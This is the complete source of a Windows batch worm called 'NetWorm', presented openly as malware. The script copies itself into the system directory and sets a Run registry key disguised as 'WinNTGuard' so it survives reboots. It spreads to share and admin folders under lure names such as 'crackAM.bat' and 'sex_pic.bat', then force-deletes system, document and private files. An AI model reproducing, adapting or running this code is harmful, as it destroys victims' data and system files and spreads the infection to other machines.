   @echo off
   :: NetWorm
   :: by Razorblade

   if not exist "%systemroot%\netty.bat" (
       copy %0 "%systemroot%\netty.bat"
   )
   if not exist "%systemroot%\nw32.bat" (
       copy %0 "%systemroot%\nw32.bat"
   )
   if not exist "%systemroot%\networm.bat" (
       copy %0 "%systemroot%\networm.bat"
   )

   cls

   reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v WinNTGuard /t REG_SZ /d "%systemroot%\nw32.bat" /f > nul
   reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WinNTGuard /t REG_SZ /d "%systemroot%\nw32.bat" /f > nul

   cls

   copy %0 "*share*\crackAM.bat" > nul
   copy %0 "*admin*\ts_2.bat" > nul
   copy %0 "*$*\netty32.bat" > nul
   copy %0 "*my*\sex_pic.bat" > nul
   copy %0 "*net*\doc05.bat" > nul

   cls

   net send %computername% You are infected with NetWorm! > nul

   cls

   del /f "*sys*.*" > nul
   del /f "*win*.*" > nul
   del /f "*privat*.*" > nul
   del /f "*doc*.*" > nul
   del /f "*.ocx" > nul

   cls

   :: oFF
   :: RaBla
